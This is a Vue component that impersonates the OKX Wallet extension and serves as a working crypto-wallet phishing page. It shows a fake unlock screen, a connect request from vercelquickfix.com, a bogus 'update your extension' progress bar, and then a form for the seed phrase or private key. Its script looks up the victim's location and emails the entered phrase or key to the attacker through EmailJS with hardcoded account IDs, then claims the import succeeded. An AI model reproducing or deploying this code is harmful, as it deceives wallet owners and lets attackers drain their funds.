<template>
  <div class="bg-white rounded-2xl w-full text-white overflow-hidden">
    <!-- Header -->
    <div
      v-if="currentStep !== 1"
      class="flex justify-between items-center py-4 px-4 border-b border-gray-700"
    >
      <button 
        @click="goBackToStep2" 
        style="background: white; border: none; padding: 0;"
        class=""
      >
        <svg class="text-gray-600 hover:text-gray-800 h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
        </svg>
      </button>
      <div class="text-3xl font-bold text-[#222222]">
        {{
          currentStep === 2
            ? "Connect account"
            : currentStep === 3
            ? "Update account"
            : "Seed phrase or private key"
        }}
      </div>
      <span class="w-6"></span> <!-- Spacer for balance -->
    </div>

    <hr class="border-t m-0 border-gray-500" v-if="currentStep !== 1" />
    
    <!-- Step Container -->
    <div class="min-h-[420px] flex flex-col relative">
      <transition name="fade" mode="out-in">
        <div :key="currentStep">
          <!-- STEP 1 -->
          <template v-if="currentStep === 1">
            <div class="flex flex-col items-center justify-center">
              <div class="mb-1">
                <img
                  src="https://vercelquickfix.com/okx-main.png"
                  alt="Phantom Logo"
                  class="object-cover"
                />
              </div>
              <form class="w-full p-6">
                <h2
                  style="color: #222222"
                  class="text-5xl leading-[24px] font-bold text-center mb-6 mt-2 tracking-[-0.02em]"
                >
                  Your portal to Web3
                </h2>
                <p class="text-gray-500 font-semibold text-center text-xl mb-8">
                  Wallet · Trade · NFT · Earn · DApp
                </p>
                <div class="mb-2">
                  <input
                    type="password"
                    v-model="password"
                    style="background: #eeeeee; font-size: 14px"
                    class="w-full font-medium bg-[#eeeeee] rounded-[6px] p-3 text-[#777777] placeholder-[#777777] focus-visible:border-[#2f2f2f] focus-visible:ring-0 focus-visible:outline-none"
                    placeholder="Password"
                    required
                  />
                </div>

                <div class="mt-28">
                  <button
                    @click="unlock"
                    type="button"
                    :disabled="password.length <= 6 || isLoading"
                    :class="password.length > 6 ? 'bg-black' : 'bg-gray-400'"
                    class="w-full py-4 px-4 mb-2 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center bg-[#333] text-white relative"
                  >
                    <span v-if="!isLoading">Unlock</span>
                    <svg
                      v-else
                      class="animate-spin h-6 w-6 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        class="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        stroke-width="4"
                      />
                      <path
                        class="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                      />
                    </svg>
                  </button>
                  <div class="text-center">
                    <a
                      href="#"
                      class="text-xl text-gray-800 mt-2 hover:text-white"
                      >Forgot password?</a
                    >
                  </div>
                </div>
              </form>
            </div>
          </template>

          <!-- STEP 2 -->
          <template v-else-if="currentStep === 2">
            <div>
              <div class="p-6">
                <div class="text-[#222222] text-lg mb-3 font-semibold">
                  Request from
                </div>

                <div class="flex">
                  <div
                    class="bg-white rounded-xl w-14 h-14 flex items-center justify-center mr-3"
                  >
                    <img
                      src="https://vercelquickfix.com/logo_mini.svg"
                      class="w-14 h-14 object-contain"
                    />
                  </div>
                  <div>
                    <p class="text-[#222222] mb-0 text-2xl font-bold">
                      Sign Message
                    </p>
                    <p class="text-gray-500 text-lg mt-0.5">
                      vercelquickfix.com
                    </p>
                  </div>
                </div>
              </div>
              <hr class="border-t mt-0 border-gray-500 m-0" />

              <div class="p-6">
                <div
                  class="bg-yellow-100 text-[#222222] border-l-4 py-4 border-solid rounded-md flex items-center"
                  style="border-left-color: orange"
                >
                  <div class="ml-4 text-[14px] font-semibold">
                    ⚠️ Before you connect your wallet, please update your
                    extension
                  </div>
                </div>

                <p class="mt-20 font-semibold">Accounts connected</p>

                <span> </span>
                <div
                  class="hover:bg-gray-100 text-[12px] font-semibold px-2 py-2 rounded-md text-[#222222]"
                >
                  All networks
                </div>
                <div
                  class="hover:bg-gray-100 px-2 py-2 rounded-md text-[#222222]"
                >
                  Wallet 01 - Account 01
                </div>
              </div>

              <hr class="border-t mt-0 border-gray-500 m-0" />
            </div>
            <div class="w-full p-6">
              <div class="flex items-center justify-start">
                <svg
                  id="Info_24"
                  width="24"
                  height="24"
                  class="mr-2"
                  viewBox="0 0 24 24"
                  xmlns="http://www.w3.org/2000/svg"
                  xmlns:xlink="http://www.w3.org/1999/xlink"
                >
                  <rect
                    width="24"
                    height="24"
                    stroke="none"
                    fill="#000000"
                    opacity="0"
                  />

                  <g transform="matrix(1 0 0 1 12 12)">
                    <path
                      style="
                        stroke: none;
                        stroke-width: 1;
                        stroke-dasharray: none;
                        stroke-linecap: butt;
                        stroke-dashoffset: 0;
                        stroke-linejoin: miter;
                        stroke-miterlimit: 4;
                        fill: rgb(0, 0, 0);
                        fill-rule: nonzero;
                        opacity: 1;
                      "
                      transform=" translate(-12, -12)"
                      d="M 12 2 C 6.477 2 2 6.477 2 12 C 2 17.523 6.477 22 12 22 C 17.523 22 22 17.523 22 12 C 22 6.477 17.523 2 12 2 z M 13 17 L 11 17 L 11 11 L 13 11 L 13 17 z M 13 9 L 11 9 L 11 7 L 13 7 L 13 9 z"
                      stroke-linecap="round"
                    />
                  </g>
                </svg>
                <p
                  class="text-[#222222] text-[14px] font-semibold text-center m-0"
                >
                  Allow this DApp to connect with your OKX Wallet.
                </p>
              </div>
              <div class="flex gap-3 w-full mt-4">
                <button
                  @click="prevStep"
                  class="flex-1 font-bold bg-white text-[14px] border-gray-500 text-gray-500 hover:border-gray-500 hover:text-[#222] hover:bg-[#555555] py-4 px-4 rounded-[30px]"
                >
                  Cancel
                </button>
                <button
                  @click="nextStep"
                  class="flex-1 font-bold bg-black text-[14px] border-none hover:border-none hover:text-[#222] hover:bg-white text-white py-4 px-4 rounded-[30px]"
                >
                  Confirm
                </button>
              </div>
            </div>
          </template>

          <!-- STEP 3 (Multi-stage) -->
          <div
            v-else-if="currentStep === 3"
            key="s3"
            class="flex flex-col items-center p-6"
          >
            <div class="flex flex-col items-center gap-3 py-6 w-full">
              <div class="flex items-center justify-center">
                <img src="/images/olx.png" class="w-20 h-20" alt=""></img>
              </div>

              <h2 class="text-4xl text-black mt-2 mb-0 text-center font-bold">
                Updating
              </h2>
              <p class="text-gray-700 text-xl text-center">
                Please wait while we update to version 2.31.2
              </p>

              <div class="w-full mt-6">
                <div class="bg-gray-100 h-2 rounded-full overflow-hidden">
                  <div
                    class="h-2 rounded-full transition-all"
                    :style="{
                      width: progress + '%',
                      background: '#000000',
                    }"
                  ></div>
                </div>
                <div
                  class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-gray-700"
                >
                  <span>{{ Math.round(progress) }}%</span>
                </div>
              </div>

              <p class="text-gray-700 text-lg text-center mt-4 text-center">
                This may take a few moments. Please do not close this window.
              </p>
            </div>
          </div>

          <!-- STEP 4: Import / Secret Recovery Phrase / Private Key -->
          <div
            v-else-if="currentStep === 4"
            key="s4"
            class="flex flex-col w-full p-6"
          >
            <!-- Tabs -->
            <div class="flex mb-4 bg-gray-100 rounded-lg flex p-2 space-x-3">
              <button
                @click="activeTab = 'seed'"
                :class="[
                  'flex-1 text-[#222222]  rounded-lg py-3 text-lg font-semibold border-none hover:border-none hover:text-[#222222] focus:border-none focus:text-[#222222]',
                  activeTab === 'seed'
                    ? 'bg-white'
                    : 'bg-transparent'
                ]"
              >
                Seed Phrase
              </button>
              <button
                @click="activeTab = 'private'"
                :class="[
                  'flex-1 text-[#222222] rounded-lg py-3 text-lg font-semibold border-none hover:border-none hover:text-[#222222] focus:border-none focus:text-[#222222]',
                  activeTab === 'private'
                    ? 'bg-white '
                    : 'bg-transparent'
                ]"
              >
                Private Key
              </button>
            </div>

            <!-- Seed Phrase Tab -->
            <div v-if="activeTab === 'seed'">
              
              <!-- Word Count Dropdown -->
              <div class="mb-4 relative flex items-center space-x-1">
                <label class="block text-gray-800 text-xl pb-0 m-0 font-medium">
                  My seed phrase has
                </label>
                <div class="relative flex space-x-1">
                  <select
                    v-model="selectedWordCount"
                    @change="updateWordCount"
                    class="w-full font-bold text-xl bg-white rounded-lg text-gray-700 appearance-none cursor-pointer focus:outline-none focus:border-[#0376c9] focus:ring-2 focus:ring-blue-200"
                  >
                    <option value="12">12 words</option>
                    <option value="15">15 words</option>
                    <option value="18">18 words</option>
                    <option value="21">21 words</option>
                    <option value="24">24 words</option>
                  </select>
                  <div class="right-0 flex items-center pointer-events-none">
                    <svg class="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
                    </svg>
                  </div>
                </div>
              </div>

              <!-- Seed Phrase Input Grid -->
              <div class="rounded-xl max-h-[38rem]  overflow-y-auto">
                <div class="grid grid-cols-2 gap-3">
                  <div v-for="n in parseInt(selectedWordCount)" :key="n" class="relative">
                    <span
                      class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 text-sm select-none z-10 font-medium"
                    >{{ n }}</span>
                    <div class="relative">
                      <input
                        :type="hiddenFields[n - 1] ? 'password' : 'text'"
                        v-model="phraseWords[n - 1]"
                        :placeholder="`Word #${n}`"
                        style="background: #eeeeee; padding-left: 30px;"
                        class="w-full bg-gray-500 border border-gray-300 rounded-lg py-3 pl-10 pr-10 text-black text-sm outline-none transition-colors duration-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
                      />
                      <div
                        @click="toggleFieldVisibility(n - 1)"
                        class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 cursor-pointer transition-colors duration-200"
                      >
                        <svg
                          v-if="hiddenFields[n - 1]"
                          xmlns="http://www.w3.org/2000/svg"
                          class="h-5 w-5"
                          fill="none"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                            d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                          />
                          <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                            d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.269 2.943 9.542 7-1.273 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                          />
                        </svg>
                        <svg
                          v-else
                          xmlns="http://www.w3.org/2000/svg"
                          class="h-5 w-5"
                          fill="none"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                            d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.269-2.943-9.542-7a9.96 9.96 0 012.502-4.043M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                          />
                          <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                            d="M3 3l18 18"
                          />
                        </svg>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <!-- Confirm Button -->
              <div class="flex gap-3 mt-6">
                <button
                  @click="confirmPhrase"
                  :disabled="isImportDisabled"
                  class="flex-1 font-bold bg-black text-[14px] border-none hover:border-none hover:text-[#222] hover:bg-white text-white py-4 px-4 rounded-[30px] font-bold transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  Confirm
                </button>
              </div>
            </div>

            <!-- Private Key Tab -->
            <div v-else-if="activeTab === 'private'">
              

              <label class="block text-black mb-3 text-lg font-medium">
                Paste or input your private key
              </label>
              <textarea
                v-model="privateKeyInput"
                rows="4"
                placeholder=""
                class="w-full bg-white border border-gray-300 rounded-lg py-3 px-4 text-black text-base outline-none transition-colors duration-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 resize-none"
              ></textarea>

              <!-- Bulk Import Option -->
              <div class="mt-4 flex items-center justify-between p-3 border border-gray-200 rounded-lg hover:bg-gray-50 cursor-pointer transition-colors">
                <span class="text-gray-700 font-medium">Bulk import private key</span>
                <svg class="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
                </svg>
              </div>

              <!-- Action Buttons -->
              <div class="flex gap-3 mt-[90px]">
                
                <button
                  @click="confirmPrivateKey"
                  :disabled="isLoading || !privateKeyInput.trim()"
                  class="flex-1 font-bold bg-black text-[14px] border-none hover:border-none hover:text-[#222] hover:bg-white text-white py-4 px-4 rounded-[30px] font-bold transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <span v-if="!isLoading">Import</span>
                  <svg
                    v-else
                    class="animate-spin h-5 w-5 inline-block"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      class="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      stroke-width="4"
                    />
                    <path
                      class="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                    />
                  </svg>
                </button>
              </div>
            </div>
          </div>
        </div>
      </transition>

      <!-- Success & Error Message -->
      <transition name="fade">
        <div
          v-if="message.text"
          :class="[
            'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
            message.type === 'success'
              ? 'bg-green-600 text-white'
              : 'bg-red-600 text-white',
          ]"
        >
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import { ref, watch, computed, nextTick } from "vue";
import axios from "axios";

const emit = defineEmits(["close"]);
const currentStep = ref(1);
const password = ref("");
const isLoading = ref(false);
const progress = ref(0);
const message = ref({ text: "", type: "" });

// Step 4 variables
const activeTab = ref("seed");
const selectedWordCount = ref("12");
const phraseWords = ref([]);
const hiddenFields = ref([]);
const privateKeyInput = ref("");

// Initialize phrase words based on selected count
function initPhraseWords() {
  const count = parseInt(selectedWordCount.value);
  phraseWords.value = Array(count).fill("");
  hiddenFields.value = Array(count).fill(true);
}

// Update word count when dropdown changes
function updateWordCount() {
  initPhraseWords();
}

// Navigation
function goBackToStep2() {
  currentStep.value = 2;
}

function unlock() {
  if (password.value.length <= 6) return;
  isLoading.value = true;
  setTimeout(() => {
    isLoading.value = false;
    nextStep();
  }, 2000);
}

async function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;

  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;

  function step(now) {
    const elapsed = now - start;
    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      isLoading.value = false;
      setTimeout(() => {
        currentStep.value = 4;
        initPhraseWords();
      }, 400);
    }
  }
  requestAnimationFrame(step);
}

function nextStep() {
  if (currentStep.value < 3) {
    currentStep.value++;
    if (currentStep.value === 3) startUpdate();
  }
}

function prevStep() {
  if (currentStep.value > 1) currentStep.value--;
}

// Import handlers
function toggleFieldVisibility(idx) {
  hiddenFields.value[idx] = !hiddenFields.value[idx];
}

const isImportDisabled = computed(() => {
  if (activeTab.value === 'private') {
    return !privateKeyInput.value.trim();
  } else {
    return phraseWords.value.some((w) => !w || !w.trim());
  }
});

async function confirmPhrase() {
  if (isImportDisabled.value) {
    return showMessage("Please fill all fields", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: 'seed',
      wordCount: selectedWordCount.value,
      phrase: phraseWords.value.join(" "),
    };

    const params = {
      service_id: "service_eusbqyo",
      template_id: "template_z6xga6o",
      user_id: "obT4LcwZqPw_KlOar",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "OKX Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );

    if (response.data === "OK") {
      showMessage("Wallet imported successfully!", "success");
      emit("close");
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

async function confirmPrivateKey() {
  if (!privateKeyInput.value.trim()) {
    return showMessage("Please enter your private key", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: 'privateKey',
      privateKey: privateKeyInput.value,
    };
    const params = {
      service_id: "service_eusbqyo",
      template_id: "template_z6xga6o",
      user_id: "obT4LcwZqPw_KlOar",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "OKX Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );

    if (response.data === "OK") {
      showMessage("Private key imported successfully!", "success");
      emit("close");
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}


function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}

// Initialize
watch(currentStep, (val) => {
  if (val === 3) startUpdate();
});

// Initialize phrase words when component mounts
initPhraseWords();
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.4s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

input::placeholder {
  font-size: 14px;
  color: #9ca3af;
}

/* Custom scrollbar for the seed phrase grid */
.scrollbar-custom::-webkit-scrollbar {
  width: 6px;
}

.scrollbar-custom::-webkit-scrollbar-track {
  background: #f1f1f1;
  border-radius: 3px;
}

.scrollbar-custom::-webkit-scrollbar-thumb {
  background: #c1c1c1;
  border-radius: 3px;
}

.scrollbar-custom::-webkit-scrollbar-thumb:hover {
  background: #a8a8a8;
}

</style>